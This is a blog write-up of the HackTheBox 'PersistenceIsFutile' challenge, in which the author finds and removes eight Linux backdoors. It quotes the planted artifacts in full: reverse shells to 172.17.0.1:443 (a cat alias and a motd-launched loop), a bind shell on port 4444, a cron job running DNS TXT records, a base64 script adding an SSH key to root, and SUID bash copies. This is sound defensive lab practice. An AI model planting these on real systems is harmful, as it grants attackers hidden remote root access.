---
layout: post
title: "HackTheBox - PersistenceIsFutile"
date: 2026-03-19
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - PersistenceIsFutile
<!-- more -->

* Challenge Scenario
    > Hackers made it onto one of our production servers 😅. We've isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn't say what they were and we can't get in touch with them. We need to get this server back into prod ASAP - we're losing money every second it's down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you're done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.
    > username: user
    > password: hackthebox

```bash
$ ssh -p <ssh_port> user@<ssh_ip>
$ scp -P <ssh_port> -r user@<ssh_ip>:<dump file path> <local path> # 把remote server的檔案dump到local server
```

## Recon & Exploit
非常喜歡這一題，練習很多linux面向的persistent
```bash
$ pwd
/home/user
$ whoami
user
$ ll
total 1168
drwxr-xr-x. 1 user user      20 Mar 19 02:12 ./
drwxr-xr-x. 1 root root      18 May 14  2021 ../
-rwsr-xr-x. 1 root root 1183448 May 14  2021 .backdoor*
-rw-r--r--. 1 user user     220 Feb 25  2020 .bash_logout
-rw-rw-r--. 1 root root    3855 Apr 23  2021 .bashrc
drwx------. 2 user user      34 Mar 19 02:12 .cache/
-rw-r--r--. 1 user user     807 Feb 25  2020 .profile
$ file .backdoor
.backdoor: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a6cb40078351e05121d46daa768e271846d5cc54, for GNU/Linux 3.2.0, stripped
$ scp -P 31793 -r user@154.57.164.69:/home/user/.backdoor /mnt/d/
```

可以看到有一個奇怪的elf檔案(`.backdoor`)，所以就dump到本機的電腦逆一下裡面寫什麼
```
~/.bashrc
~/.bash_profile
~/.bash_login
~/.profile
/etc/bash.bashrc
/etc/profile
PS1
PS2
FUNCNAME
BASH_SOURCE
BASH_LINENO
BASH_ENV
SSH_CLIENT
SSH2_CLIENT
TERM
EMACS
```

### 惡意alias
從以上的關鍵字會發現bashrc和環境變數可能有問題
```bash
$ cat .bashrc
...
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
...
$ set
$ ll /home/user/.bash_history
ls: cannot access '/home/user/.bash_history': No such file or directory
$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\\'')"'
alias cat='(bash -i >& /dev/tcp/172.17.0.1/443 0>&1 & disown) 2>/dev/null; cat'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
```

從以上的bashrc內容看得出來cat被alias成惡意的操作，所以我直接看所有的alias，發現真的只有`$ cat`這個惡意command，所以直接把這個alias註解掉
```bash
$ unalias cat
```

### 查看root
```bash
$ sudo ls -al /root
total 9396
drwx------. 1 root root      21 May 14  2021 .
drwxr-xr-x. 1 root root      51 Mar 19 02:07 ..
-rw-r--r--. 1 root root    3838 Jan 24  2021 .bashrc
drwxr-xr-x. 3 root root      17 May 14  2021 .cache
-rw-r--r--. 1 root root     161 Dec  5  2019 .profile
drwxr-xr-x. 1 root root      29 May 14  2021 .ssh
-rwsr-xr-x. 1 root root 9612512 May  7  2021 solveme
$ sudo cat /root/.bashrc
...
alertd -e /bin/bash -lnp 4444 &
...
```
會看到這行命令會啟動一個 daemon (alertd)這個某個command其實沒看過，所以合理懷疑應該是惡意的command，而這個command的實際elf file在`/usr/bin`中
* 監聽 4444 port
* 當有人連進來時，啟動一個 bash shell
* 背景執行，達到 遠端控制 / 反彈 shell

把該檔案刪除並且把該command註解掉
```bash
$ sudo rm -rf /usr/bin/alertd
```

### 惡意的排程任務
這也是linux persistent的起手式
```bash
$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
```
果然看到奇怪的東西，把這個排程取消掉
```bash
$ crontab -e # 直接註解掉就好了
```

### ssh public key authorized
另外，也看一下系統級的cron有什麼問題
```bash
$ ll /etc/cron*
...
/etc/cron.daily:
total 44
drwxr-xr-x. 1 root root   23 May 14  2021 ./
drwxr-xr-x. 1 root root   24 May 14  2021 ../
-rw-r--r--. 1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x. 1 root root  311 Jul 16  2019 0anacron*
-rwxr-xr-x. 1 root root  301 Apr 23  2021 access-up*
-rwxr-xr-x. 1 root root 1478 Apr  9  2020 apt-compat*
-rwxr-xr-x. 1 root root  355 Dec 29  2017 bsdmainutils*
-rwxr-xr-x. 1 root root 1187 Sep  5  2019 dpkg*
-rwxr-xr-x. 1 root root  377 Jan 21  2019 logrotate*
-rwxr-xr-x. 1 root root 1123 Feb 25  2020 man-db*
-rwxr-xr-x. 1 root root 4574 Jul 18  2019 popularity-contest*
-rwxr-xr-x. 1 root root  199 Jan 24  2021 pyssh*
...
```
有問題的是`pyssh`和`/etc/cron.daily/access-up`這兩個腳本
```bash
$ cat /etc/cron.daily/pyssh
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
$ cat /etc/cron.daily/access-up
#!/bin/bash


DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
```

這兩個檔案在做的事情不一樣，前者主要是觸發ssh的python library，後者則是更改UUID，先看前者在做什麼
```bash
$ cat /lib/python3/dist-packages/ssh_import_id_update
#!/bin/bash

KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
$ echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 nobody@nothing
$ echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d
/root/.ssh/authorized_keys
```
實際decode會發現就是把ssh public key寫入授權的key list，讓持有對應私鑰的人可以直接 SSH 登入 root，不需要密碼，把這個檔案刪除並且修改ssh authorized key file
```bash
$ sudo rm -rf /etc/cron.daily/pyssh /etc/cron.daily/access-up /lib/python3/dist-packages/ssh_import_id_update
$ sudo vim /root/.ssh/authorized_keys
```

### 惡意的其他後門
接著看第二個檔案在做的事情是將`/bin/bash`複製到一些隨機的檔案路徑，並賦予SUID檔案屬性。所以難的地方就是那些隨機的filename是什麼，這個部分我是參考[^1]的紀錄
```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x. 1 root root 1183448 May 14  2021 /home/user/.backdoor
-rwsr-xr-x. 1 root root 85064 May 28  2020 /usr/bin/chfn
-rwsr-xr-x. 1 root root 53040 May 28  2020 /usr/bin/chsh
-rwsr-xr-x. 1 root root 88464 May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x. 1 root root 44784 May 28  2020 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 68208 May 28  2020 /usr/bin/passwd
-rwsr-xr-x. 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x. 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x. 1 root root 1183448 Jun 18  2020 /usr/bin/dlxcrw
-rwsr-xr-x. 1 root root 1183448 Jun 18  2020 /usr/bin/mgxttm
-rwsr-xr-x. 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr--. 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x. 1 root root 473576 Mar  9  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x. 1 root root 1183448 Jun 18  2020 /usr/sbin/afdluk
-rwsr-xr-x. 1 root root 129816 May 14  2021 /usr/sbin/ppppd
$ sudo rm -rf /home/user/.backdoor /usr/sbin/ppppd /usr/sbin/afdluk /usr/bin/mgxttm /usr/bin/dlxcrw
```
把這些檔案刪除

### 惡意的process
```bash
$ ps aux -u root
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2624  1684 ?        Ss   05:19   0:00 /bin/sh -c /usr/sbin/sshd -D -p 23
root           7  0.0  0.0  12192  7500 ?        S    05:19   0:00 sshd: /usr/sbin/sshd -D -p 23 [listener] 0 of 10-100 startups
root           8  0.0  0.0  13912  9220 ?        Ss   05:19   0:00 sshd: user [priv]
root          18  0.0  0.0   3992  3008 ?        S    05:19   0:00 /bin/bash /var/lib/private/connectivity-check
root         134  0.0  0.0   3992  1736 ?        S    05:40   0:00 /bin/bash /var/lib/private/connectivity-check
user         137  0.0  0.0   7664  3328 pts/0    R+   05:41   0:00 ps aux
$ sudo cat /var/lib/private/connectivity-check
#!/bin/bash

while true; do
    nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1;
    sleep 10;
done
$ sudo kill 18 134
```
實際看`/var/lib/private/connectivity-check`寫了什麼發現是一個reverse shell，所以要把這個process kill掉並且把檔案刪除

另外，這個檔案是由誰或什麼execute
```bash
$ grep -R "connectivity-check" /etc 2>/dev/null
/etc/update-motd.d/30-connectivity-check:nohup /var/lib/private/connectivity-check &
$ sudo cat /etc/update-motd.d/30-connectivity-check
#!/bin/bash

nohup /var/lib/private/connectivity-check 
$ sudo rm -rf /var/lib/private/connectivity-check /etc/update-motd.d/30-connectivity-check
```
所以也要把這個檔案刪除

### 查看/etc/passwd - 通靈
這個也是參考[^1]的說明，發現gnats這個user的GID被改成root，而且shell被改成`/bin/bash`
```bash
$ sudo cat /etc/passwd
...
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shell
...
$ sudo vim /etc/passwd
↓
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/nologin
```

## Reference
[^1]:[ 網路安全實戰- HTB PersistenceIsFutile ](https://juejin.cn/post/7231565908631650363)